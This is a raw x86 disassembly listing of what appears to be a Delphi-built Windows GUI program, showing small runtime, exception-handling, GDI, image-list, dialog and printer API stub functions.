mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_420461
jmp sub_403a3c
sub_420468
pop ebx
pop ecx
pop ebp
retn
sub_4205e1
jmp sub_403a3c
sub_420609
jmp sub_403a3c
sub_420610
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_42067c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_40429c
pop esi
pop ebx
retn
sub_4206f0
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_42064c
push eax
call MulDiv
neg eax
pop ebx
retn
sub_420764
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_420794
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_4208b2
jmp sub_403a3c
sub_4208b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_420000
retn
sub_4208cf
jmp sub_403a3c
sub_420945
jmp sub_403a3c
sub_42094c
pop ebx
pop ecx
pop ebp
retn
sub_420950
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_420a06
jmp sub_403a3c
sub_420a18
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_4034e4
sub_420a2c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_420a5c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_420b6b
jmp sub_403a3c
sub_420b72
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_420000
retn
sub_420b88
jmp sub_403a3c
sub_420c01
jmp sub_403a3c
sub_420c08
pop ebx
pop ecx
pop ebp
retn
sub_420d39
jmp sub_403a3c
sub_420d4c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_4210c0
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_421354
jmp sub_403a3c
sub_42135b
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_421364
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_42139c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4213a8
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4214e8
retn
sub_4215b1
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4215c8
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4216b4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4216d4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4216f4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_421714
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
pop ebx
retn
sub_42172c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
pop ebx
retn
sub_421750
mov eax [ rw-data ]
call sub_42172c
retn
sub_4217b2
jmp sub_403a3c
sub_4217b9
pop ecx
pop ebp
retn
sub_421858
jmp sub_403a3c
sub_42185f
pop ebx
mov esp ebp
pop ebp
retn
sub_421931
jmp sub_403a3c
sub_4219c2
jmp sub_403a3c
sub_4219c9
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4219f4
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_421adb
jmp sub_403a3c
sub_421c88
jmp sub_403a3c
sub_421c8f
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_421ea1
jmp sub_403a3c
sub_421ea8
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_421f42
jmp sub_403a3c
sub_42211e
jmp sub_403a3c
sub_4221d8
jmp sub_403a3c
sub_4221df
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4221ff
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4221f8
jmp sub_403a3c
sub_4221ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42238d
jmp sub_403a3c
sub_422558
jmp sub_403a3c
sub_42255f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422582
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_40278c
retn
sub_42257b
jmp sub_403a3c
sub_422582
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225a2
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_40278c
retn
sub_42259b
jmp sub_403a3c
sub_4225a2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4225ac
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_42270c
push 0x0
call sub_4226a8
retn
sub_4227b1
jmp sub_403a3c
sub_4227b8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4227c4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_422714
pop ebx
pop ebp
retn 0x4
sub_4227d8
retn
sub_4227dc
test eax eax
jne r-xdata
retn
call sub_4227d8
sub_4229af
jmp sub_403a3c
sub_4229d6
jmp sub_403a3c
sub_4229dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422a1c
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_422be9
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
sub_422bf2
jmp sub_403a3c
j_sub_422be9
jmp sub_422be9
sub_422bf9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
sub_422c0f
jmp sub_403a3c
sub_422c20
xor eax eax
retn
sub_422c24
mov al [ eax + 0x21 ]
retn
sub_422c70
jmp sub_403a3c
sub_422c77
pop esi
pop ecx
pop ebp
retn
sub_422ca4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_422cfb
jmp sub_403a3c
sub_422d02
pop esi
pop ecx
pop ebp
retn
sub_422d08
retn
sub_422d0c
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422d1c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_422ea1
jmp sub_403a3c
sub_422ea8
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_422fc7
jmp sub_403a3c
sub_422fce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_423056
jmp sub_403a3c
sub_42305d
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4231b8
jmp sub_403788
sub_4231dc
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_422dc4
mov [ rw-data ] eax
sub_4231fc
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4230c8
mov [ rw-data ] eax
sub_423324
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4232c0
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_42333c
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4232c0
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_423354
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4232c0
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_4233fc
jmp sub_403788
sub_42341c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_423324
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_423434
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_423324
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_4235a1
jmp sub_403788
sub_42361f
jmp sub_403a3c
sub_423626
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423754
xor edx edx
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx eax
sub_42376c
xor edx edx
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx eax
sub_4237c0
retn
sub_423834
jmp sub_403a3c
sub_423a4b
jmp sub_403a3c
sub_423a52
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a6f
lea eax [ ebp - 0x20 ]
call sub_404038
retn
sub_423a68
jmp sub_403a3c
sub_423d7c
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_423d84
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_423df8
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
mov eax ebx
call sub_423f6c
sub_423e10
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
mov eax ebx
call sub_423f6c
sub_4240c0
jmp sub_403a3c
sub_4240c7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42423f
jmp sub_403a3c
sub_424246
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4242d5
jmp sub_403a3c
sub_4242dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4242fe
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
sub_4242f7
jmp sub_403a3c
sub_4242fe
pop ebx
mov esp ebp
pop ebp
retn
sub_424311
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_424688
jmp r-xdata
retn
sub_424327
call sub_424714
retn
sub_4244ac
retn
sub_424704
jmp sub_403a3c
sub_42482f
jmp sub_403a3c
sub_424836
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_42484f
jmp sub_403a3c
sub_424914
push ebx
mov ebx eax
mov eax ebx
call sub_424584
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax edx
pop ebx
retn
sub_424a42
jmp sub_403a3c
sub_424a6a
jmp sub_403a3c
sub_424a71
mov esp ebp
pop ebp
retn
sub_424ae8
jmp sub_403a3c
sub_424bf0
jmp sub_403a3c
sub_424cdb
jmp sub_403a3c
sub_424ce8
inc [ eax + 0x4 ]
retn
sub_424e63
jmp sub_403a3c
sub_425214
jmp sub_403a3c
sub_42545e
jmp sub_403a3c
sub_425488
jmp sub_403a3c
sub_42548f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254b1
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_4254aa
jmp sub_403a3c
sub_4254bb
jmp sub_403788
sub_42550a
jmp sub_403a3c
sub_425737
jmp sub_403a3c
sub_42577f
jmp sub_403a3c
sub_4258ec
jmp sub_403a3c
sub_4259b3
jmp sub_403788
sub_425a08
mov [ eax + 0x31 ] 0x0
call sub_422a1c
retn
sub_425c59
jmp sub_403a3c
sub_425cc4
jmp sub_403a3c
sub_425ccb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425d3c
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_425df0
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_425e00
push ebx
mov ebx eax
mov eax ebx
call sub_425fb8
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_425e14
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_425e30
push ebx
mov ebx eax
mov eax ebx
call sub_426018
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_425e8c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_425f9b
jmp sub_403a3c
sub_4261ff
jmp sub_403788
sub_42625f
jmp sub_403a3c
sub_426266
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_426647
jmp sub_403a3c
sub_426673
jmp sub_403a3c
sub_4266da
jmp sub_403788
sub_42670b
jmp sub_403a3c
sub_426790
jmp sub_403788
sub_426795
mov eax [ ebp - 0x38 ]
call sub_4032e8
call sub_403a9c
call sub_403af0
sub_4267a7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4267c4
mov eax [ ebp - 0x18 ]
call sub_40278c
retn
sub_4267bd
jmp sub_403a3c
sub_426913
jmp sub_403788
sub_426bdf
jmp sub_403788
sub_426c70
mov cl 0x1
call sub_426c78
retn
sub_426f88
xor ecx ecx
call sub_426c78
retn
sub_42700a
jmp sub_403788
sub_42700f
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a9c
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_427060
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_427199
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_4271c8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_4271dc
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_4272f5
jmp sub_403788
sub_4273aa
jmp sub_403788
sub_427414
jmp sub_403788
sub_427448
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_4273d4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_427460
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_421714
retn
mov [ eax + 0x30 ] edx
retn
sub_427478
retn
sub_42747c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_421714
retn
mov [ eax + 0x2c ] edx
retn
sub_4274bc
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_421714
pop ebp
retn 0x4
sub_4274d0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_421714
pop ebp
retn 0x4
sub_427690
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42769c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_427749
jmp sub_403a3c
sub_427750
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42783b
jmp sub_403788
sub_4278a7
jmp sub_403a3c
sub_4279d5
jmp sub_403a3c
sub_4279dc
pop ebp
retn
sub_427adc
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_427b11
jmp sub_403a3c
sub_427b18
pop ebp
retn
sub_427b1c
sub [ rw-data ] 0x1
retn
sub_427d64
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_417570
retn
sub_427d98
mov eax [ eax + 0x4 ]
call sub_417414
retn
sub_427dc9
jmp sub_403a3c
sub_427dd0
pop ebp
retn
sub_427dd4
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_14(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ __import_lookup_table_14(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_14(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_14(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_14(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_14(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_14(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_14(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_427f59
jmp sub_403a3c
sub_427f60
pop ebp
retn
sub_427f64
sub [ rw-data ] 0x1
retn
sub_42802b
jmp sub_403a3c
sub_428032
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428648
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_428054
mov [ rw-data ] sub_42816c
mov [ rw-data ] sub_4280dc
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_428370
mov [ rw-data ] sub_428444
mov [ rw-data ] sub_428518
retn
sub_4286d9
jmp sub_403a3c
sub_4286e0
pop ebp
retn
sub_4286e4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_428648
sub_428719
jmp sub_403a3c
sub_428720
pop ebp
retn
sub_428724
sub [ rw-data ] 0x1
retn
sub_4289b3
add eax 0xffffffd4
jmp sub_4294e0
sub_4289bb
add eax 0xffffffd4
jmp sub_42953c
sub_4289c3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4059d4
sub_4289cd
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4059fc
sub_4289d7
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a10
sub_4289e5
inc edx
add [ edi - 0x77 ] bh
inc edx
add [ ecx + 0x5d004289 ] cl
mov [ edx ] eax
mov [ gs : edx ] eax
insd
mov [ edx ] eax
retn
sub_428b66
jmp sub_403a3c
sub_428b6d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_428d7d
jmp sub_403a3c
sub_428d84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428f39
jmp sub_403a3c
sub_428f9e
jmp sub_403a3c
sub_428fa5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429091
jmp sub_403a3c
sub_429098
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4292a8
lea eax [ ebp - 0x30 ]
call sub_404038
lea eax [ ebp - 0x20 ]
call sub_404038
retn
sub_4292b9
jmp sub_403a3c
j_sub_4292a8
jmp sub_4292a8
sub_4292c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4293bb
jmp sub_403a3c
sub_4293c2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4294bf
jmp sub_403a3c
sub_4294c6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42952f
jmp sub_403a3c
sub_429536
pop ebx
pop ecx
pop ebp
retn
sub_4295d1
jmp sub_403a3c
sub_4295d8
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4295e4
mov eax [ eax + 0x20 ]
retn
sub_429713
jmp sub_403a3c
sub_42971a
pop ebp
retn
sub_42971c
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_15(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_429769
jmp sub_403a3c
sub_429770
pop ebp
retn
sub_429774
sub [ rw-data ] 0x1
retn
sub_4299db
jmp sub_403a3c
sub_4299e2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_429bc2
jmp sub_403a3c
sub_429bc9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_429c35
jmp sub_403a3c
sub_429c3c
pop ecx
pop ecx
pop ebp
retn
sub_429f53
jmp sub_403a3c
sub_429f5a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_429f64
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_429aa4
mov eax [ ebx + 0x20 ]
pop ebx
retn
sub_429fcf
jmp sub_403a3c
sub_429fd6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_42a046
jmp sub_403a3c
sub_42a04d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a054
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_42a2ac
sub_42a247
jmp sub_403a3c
sub_42a258
jmp sub_403788
sub_42a29b
jmp sub_403a3c
sub_42a2a2
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a449
jmp sub_403a3c
sub_42a489
jmp sub_403a3c
sub_42a490
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a4e8
add eax 0x8
call sub_40d18c
retn
sub_42a4f4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4299ec
mov [ rw-data ] eax
sub_42a545
jmp sub_403a3c
sub_42a54c
pop ebp
retn
sub_42a550
sub [ rw-data ] 0x1
retn
sub_42a85d
jmp sub_403a3c
sub_42a864
pop ebp
retn
sub_42a868
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42a5b4
sub_42a948
retn
sub_42a9bc
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42a9c8
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42a9d4
mov edx [ eax ]
call [ edx ]
retn
sub_42a9dc
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42aa09
jmp sub_403a3c
sub_42aa10
pop ebp
retn
sub_42aa14
sub [ rw-data ] 0x1
retn
sub_42abd3
jmp sub_403a3c
sub_42abda
pop ebp
retn
sub_42af8f
jmp sub_403a3c
sub_42af96
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42b3b0
jmp sub_403a3c
sub_42b3b7
pop ebp
retn
sub_42b3bc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a94c
mov [ rw-data ] eax
sub_42b3fd
jmp sub_403a3c
sub_42b404
pop ebp
retn
sub_42b408
sub [ rw-data ] 0x1
retn
sub_42b435
jmp sub_403a3c
sub_42b43c
pop ebp
retn
sub_42b440
sub [ rw-data ] 0x1
retn
sub_42b46d
jmp sub_403a3c
sub_42b474
pop ebp
retn
sub_42b478
sub [ rw-data ] 0x1
retn
sub_42b4a5
jmp sub_403a3c
sub_42b4ac
pop ebp
retn
sub_42b4b0
sub [ rw-data ] 0x1
retn
sub_42b4dd
jmp sub_403a3c
sub_42b4e4
pop ebp
retn
sub_42b4e8
sub [ rw-data ] 0x1
retn
sub_42b515
jmp sub_403a3c
sub_42b51c
pop ebp
retn
sub_42b520
sub [ rw-data ] 0x1
retn
sub_42b54d
jmp sub_403a3c
sub_42b554
pop ebp
retn
sub_42b558
sub [ rw-data ] 0x1
retn
ChooseColorA
jmp [ __import_lookup_table_16(comdlg32:ChooseColorA) ]
FindTextA
jmp [ FindTextA@IAT ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
ChooseFontA
jmp [ ChooseFontA@IAT ]
PrintDlgA
jmp [ __import_lookup_table_16(comdlg32:PrintDlgA) ]
sub_42b5ad
jmp sub_403a3c
sub_42b5b4
pop ebp
retn
sub_42b5b8
sub [ rw-data ] 0x1
retn
sub_42b5e5
jmp sub_403a3c
sub_42b5ec
pop ebp
retn
sub_42b5f0
sub [ rw-data ] 0x1
retn
sub_42b641
retn
sub_42c4ae
jmp sub_403788
sub_42c4b3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c4d0
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42c4d8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_4034e4
pop esi
retn
sub_42c4f0
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_4034e4
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42c508
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42c5b1
jmp sub_403a3c
sub_42c5df
jmp sub_403a3c
sub_42c5e6
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c5f0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42c604
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42c729
jmp sub_403a3c
sub_42c730
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c7f6
jmp sub_403a3c
sub_42c7fd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c8d8
push esi
mov esi eax
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42c9e4
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_42ca87
jmp sub_403788
sub_42cc41
jmp sub_403a3c
sub_42cc48
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cc54
push esi
